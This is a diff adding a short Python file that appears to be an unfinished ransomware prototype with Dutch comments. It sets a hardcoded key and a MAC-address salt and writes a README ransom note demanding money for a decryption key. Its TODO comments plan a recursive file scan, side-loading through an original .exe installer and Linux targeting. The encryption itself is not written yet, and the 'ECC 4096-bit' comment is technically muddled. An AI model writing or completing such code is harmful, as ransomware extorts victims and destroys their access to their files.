@@ -1,0 +1,25 @@
+from cryptography.fernet import Fernet
+import glob
+import hashlib
+from getmac import get_mac_address as gma
+
+#Standaardwaarde definieëren.
+Macaddress = gma()
+Hardcoded_key = str("wijzijnechtongelofelijkgoedehackers")
+
+#Readme aanmaken.
+Readme = open("README.txt","w")
+Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\n Om je bestanden tedecrypten moet je geld overmaken naar XXX.\n Dan zal je de decryptkey ontvangen!")
+Readme.close()
+
+#Endstage
+print("Code 200!")
+
+# Scan Dirs voor locatie (Waar ben ik?)
+# Doe een glob.glob() scan voor de beschikbare bestanden (recursive)
+# Side-loaden via orginele .exe installer.
+# MAC als salt + harcoded key.
+# README tegen het einde.
+# Linux based
+# ECC 4096-bit
+# Hoe de Priv key ontvangen?
